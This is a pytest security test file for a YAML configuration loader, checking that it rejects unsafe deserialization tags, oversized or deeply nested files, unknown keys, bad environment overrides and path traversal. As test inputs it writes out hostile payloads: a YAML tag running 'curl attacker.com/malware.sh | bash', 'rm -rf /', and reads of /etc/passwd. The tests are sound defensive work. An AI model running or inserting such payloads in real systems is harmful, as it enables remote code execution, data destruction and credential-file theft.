"""Security tests for YAML configuration loading (CWE-502)."""

import os
import tempfile
from pathlib import Path

import pytest

from corpus_callosum.config.loader import (
    ALLOWED_CONFIG_KEYS,
    MAX_CONFIG_FILE_SIZE,
    MAX_ENV_VALUE_LENGTH,
    load_yaml,
    parse_env_overrides,
)
from corpus_callosum.utils.security import SecurityError


class TestYAMLCodeExecutionPrevention:
    """Tests for preventing code execution via YAML deserialization."""

    def test_rejects_python_object_execution(self, tmp_path):
        """Test that !!python/object patterns are rejected."""
        malicious_yaml = """
!!python/object/apply:os.system
args: ['curl attacker.com/malware.sh | bash']
"""
        yaml_file = tmp_path / "malicious.yaml"
        yaml_file.write_text(malicious_yaml)

        with pytest.raises(
            SecurityError, match="Suspicious pattern.*!!python"
        ):
            load_yaml(yaml_file)

    def test_rejects_python_module_patterns(self, tmp_path):
        """Test that various Python patterns are rejected."""
        malicious_patterns = [
            "!!python/module:os.system",
            "!!ruby/object:Gem::Installer",
            "!!perl/code:CORE::system",
        ]

        for pattern in malicious_patterns:
            yaml_file = tmp_path / "malicious.yaml"
            yaml_file.write_text(f"{pattern}\nfoo: bar\n")

            with pytest.raises(SecurityError, match="Suspicious pattern"):
                load_yaml(yaml_file)

    def test_rejects_eval_patterns(self, tmp_path):
        """Test that eval/exec patterns are rejected."""
        dangerous_content = """
database:
  init_script: eval(open('/etc/passwd').read())
"""
        yaml_file = tmp_path / "dangerous.yaml"
        yaml_file.write_text(dangerous_content)

        with pytest.raises(SecurityError, match="Suspicious pattern.*eval"):
            load_yaml(yaml_file)

    def test_rejects_subprocess_patterns(self, tmp_path):
        """Test that subprocess patterns are rejected."""
        dangerous_content = """
llm:
  endpoint: http://localhost:5000
  setup_script: subprocess.Popen(['malware'])
"""
        yaml_file = tmp_path / "dangerous.yaml"
        yaml_file.write_text(dangerous_content)

        with pytest.raises(SecurityError, match="Suspicious pattern.*subprocess"):
            load_yaml(yaml_file)

    def test_rejects_os_system_patterns(self, tmp_path):
        """Test that os.system patterns are rejected."""
        dangerous_content = """
paths:
  vault: /tmp/vault
  custom_init: os.system('rm -rf /')
"""
        yaml_file = tmp_path / "dangerous.yaml"
        yaml_file.write_text(dangerous_content)

        with pytest.raises(SecurityError, match="Suspicious pattern.*os.system"):
            load_yaml(yaml_file)


class TestYAMLSizeValidation:
    """Tests for YAML file size validation."""

    def test_accepts_small_yaml(self, tmp_path):
        """Test that small YAML files are accepted."""
        yaml_content = """
llm:
  model: llama3
  endpoint: http://localhost:5000
database:
  backend: chromadb
"""
        yaml_file = tmp_path / "small.yaml"
        yaml_file.write_text(yaml_content)

        result = load_yaml(yaml_file, validate_schema=False)
        assert result["llm"]["model"] == "llama3"

    def test_rejects_oversized_yaml(self, tmp_path):
        """Test that oversized YAML files are rejected."""
        # Create file larger than MAX_CONFIG_FILE_SIZE
        yaml_file = tmp_path / "large.yaml"
        large_content = "x: " + "a" * (MAX_CONFIG_FILE_SIZE + 1)
        yaml_file.write_text(large_content)

        with pytest.raises(SecurityError, match="Configuration file too large"):
            load_yaml(yaml_file, validate_schema=False)


class TestYAMLSchemaValidation:
    """Tests for YAML schema validation."""

    def test_accepts_allowed_keys(self, tmp_path):
        """Test that allowed configuration keys are accepted."""
        yaml_content = """
llm:
  model: llama3
embedding:
  backend: ollama
database:
  backend: chromadb
"""
        yaml_file = tmp_path / "valid.yaml"
        yaml_file.write_text(yaml_content)

        result = load_yaml(yaml_file, validate_schema=True)
        assert "llm" in result
        assert "embedding" in result
        assert "database" in result

    def test_rejects_unknown_keys(self, tmp_path):
        """Test that unknown keys are rejected."""
        yaml_content = """
malicious_key: "evil"
another_bad_key: "worse"
database: {}
"""
        yaml_file = tmp_path / "invalid.yaml"
        yaml_file.write_text(yaml_content)

        with pytest.raises(SecurityError, match="Unknown configuration keys"):
            load_yaml(yaml_file, validate_schema=True)

    def test_schema_validation_optional(self, tmp_path):
        """Test that schema validation can be disabled."""
        yaml_content = """
unknown_section:
  some_data: value
"""
        yaml_file = tmp_path / "unknown.yaml"
        yaml_file.write_text(yaml_content)

        # Should succeed when schema validation disabled
        result = load_yaml(yaml_file, validate_schema=False)
        assert "unknown_section" in result


class TestYAMLNestingDepth:
    """Tests for YAML nesting depth validation."""

    def test_accepts_reasonable_nesting(self, tmp_path):
        """Test that reasonable nesting is accepted."""
        yaml_content = """
llm:
  config:
    timeout:
      connect: 10
      read: 30
"""
        yaml_file = tmp_path / "nested.yaml"
        yaml_file.write_text(yaml_content)

        result = load_yaml(yaml_file, validate_schema=False)
        assert result["llm"]["config"]["timeout"]["connect"] == 10

    def test_rejects_excessive_nesting(self, tmp_path):
        """Test that excessive nesting is rejected."""
        # Create deeply nested YAML beyond MAX_NESTING_DEPTH
        yaml_content = "a:\n  b:\n    c:\n      d:\n        e:\n          f:\n            g: value\n"
        yaml_file = tmp_path / "deep.yaml"
        yaml_file.write_text(yaml_content)

        with pytest.raises(SecurityError, match="nesting depth"):
            load_yaml(yaml_file, validate_schema=False)


class TestYAMLStructureValidation:
    """Tests for YAML structure validation."""

    def test_rejects_non_dict_root(self, tmp_path):
        """Test that non-dictionary root is rejected."""
        yaml_content = "- item1\n- item2\n"
        yaml_file = tmp_path / "list.yaml"
        yaml_file.write_text(yaml_content)

        with pytest.raises(SecurityError, match="must be a dictionary"):
            load_yaml(yaml_file, validate_schema=False)

    def test_accepts_empty_yaml(self, tmp_path):
        """Test that empty YAML returns empty dict."""
        yaml_file = tmp_path / "empty.yaml"
        yaml_file.write_text("")

        result = load_yaml(yaml_file, validate_schema=False)
        assert result == {}

    def test_accepts_null_yaml(self, tmp_path):
        """Test that YAML with just 'null' returns empty dict."""
        yaml_file = tmp_path / "null.yaml"
        yaml_file.write_text("null\n")

        result = load_yaml(yaml_file, validate_schema=False)
        assert result == {}


class TestEnvironmentVariableOverrides:
    """Tests for environment variable override parsing."""

    def test_parses_simple_env_override(self, monkeypatch):
        """Test parsing simple environment variable overrides."""
        monkeypatch.setenv("CC_LLM_MODEL", "llama3")
        monkeypatch.setenv("CC_LLM_ENDPOINT", "http://localhost:5000")

        result = parse_env_overrides()

        assert result["llm"]["model"] == "llama3"
        assert result["llm"]["endpoint"] == "http://localhost:5000"

    def test_parses_typed_values(self, monkeypatch):
        """Test parsing typed values from environment."""
        monkeypatch.setenv("CC_LLM_TIMEOUT", "30")
        monkeypatch.setenv("CC_LLM_TEMPERATURE", "0.7")
        monkeypatch.setenv("CC_LLM_ENABLED", "true")

        result = parse_env_overrides()

        assert result["llm"]["timeout"] == 30
        assert result["llm"]["temperature"] == 0.7
        assert result["llm"]["enabled"] is True

    def test_rejects_non_alphanumeric_keys(self, monkeypatch):
        """Test that non-alphanumeric keys are rejected."""
        monkeypatch.setenv("CC_LLM-INVALID", "value")

        with pytest.raises(SecurityError, match="Invalid environment variable format"):
            parse_env_overrides()

    def test_rejects_oversized_values(self, monkeypatch):
        """Test that oversized environment values are rejected."""
        large_value = "x" * (MAX_ENV_VALUE_LENGTH + 1)
        monkeypatch.setenv("CC_LLM_CONFIG", large_value)

        with pytest.raises(SecurityError, match="value too long"):
            parse_env_overrides()

    def test_rejects_conflicting_keys(self, monkeypatch):
        """Test that conflicting keys are rejected."""
        monkeypatch.setenv("CC_LLM", "value1")
        monkeypatch.setenv("CC_LLM_MODEL", "llama3")

        with pytest.raises(SecurityError, match="cannot be both"):
            parse_env_overrides()

    def test_ignores_non_cc_variables(self, monkeypatch):
        """Test that non-CC_ prefixed variables are ignored."""
        monkeypatch.setenv("OTHER_VAR", "value")
        monkeypatch.setenv("CC_LLM_MODEL", "llama3")

        result = parse_env_overrides()

        assert "other_var" not in result
        assert result["llm"]["model"] == "llama3"

    def test_custom_prefix(self, monkeypatch):
        """Test using custom environment variable prefix."""
        monkeypatch.setenv("APP_LLM_MODEL", "llama3")

        result = parse_env_overrides(prefix="APP_")

        assert result["llm"]["model"] == "llama3"


class TestYAMLFilePathValidation:
    """Tests for file path validation."""

    def test_rejects_nonexistent_file(self):
        """Test that nonexistent files are rejected."""
        with pytest.raises(FileNotFoundError):
            load_yaml(Path("/nonexistent/config.yaml"))

    def test_rejects_path_traversal(self, tmp_path):
        """Test that path traversal attempts are rejected."""
        yaml_file = tmp_path / "config.yaml"
        yaml_file.write_text("test: value")

        # Try to access file using path traversal
        traversal_path = yaml_file.parent / ".." / ".." / "etc" / "passwd"

        with pytest.raises(Exception):  # PathTraversalError or other
            load_yaml(traversal_path)

    def test_resolves_symlinks(self, tmp_path):
        """Test that symlinks are properly resolved."""
        # Create actual file
        actual_file = tmp_path / "actual.yaml"
        actual_file.write_text("test: value")

        # Create symlink (skip on Windows where symlinks need special perms)
        try:
            symlink = tmp_path / "link.yaml"
            symlink.symlink_to(actual_file)

            result = load_yaml(symlink, validate_schema=False)
            assert result["test"] == "value"
        except (OSError, NotImplementedError):
            # Skip on systems that don't support symlinks
            pytest.skip("Symlinks not supported on this system")


class TestIntegration:
    """Integration tests for configuration loading."""

    def test_load_valid_config(self, tmp_path):
        """Test loading a valid complete configuration."""
        yaml_content = """
llm:
  model: llama3
  endpoint: http://localhost:5000
  timeout_seconds: 30
embedding:
  backend: ollama
  model: all-minilm
database:
  backend: chromadb
  mode: persistent
"""
        yaml_file = tmp_path / "config.yaml"
        yaml_file.write_text(yaml_content)

        result = load_yaml(yaml_file, validate_schema=True)

        assert result["llm"]["model"] == "llama3"
        assert result["embedding"]["backend"] == "ollama"
        assert result["database"]["mode"] == "persistent"

    def test_config_with_env_overrides(self, tmp_path, monkeypatch):
        """Test configuration loading with environment overrides."""
        yaml_content = """
llm:
  model: llama2
  endpoint: http://localhost:5000
"""
        yaml_file = tmp_path / "config.yaml"
        yaml_file.write_text(yaml_content)

        # Set override
        monkeypatch.setenv("CC_LLM_MODEL", "llama3")

        result = load_yaml(yaml_file, validate_schema=False)
        # Note: load_yaml doesn't apply env overrides, that's in load_config
        assert result["llm"]["model"] == "llama2"

        # Test parsing overrides separately
        overrides = parse_env_overrides()
        assert overrides["llm"]["model"] == "llama3"
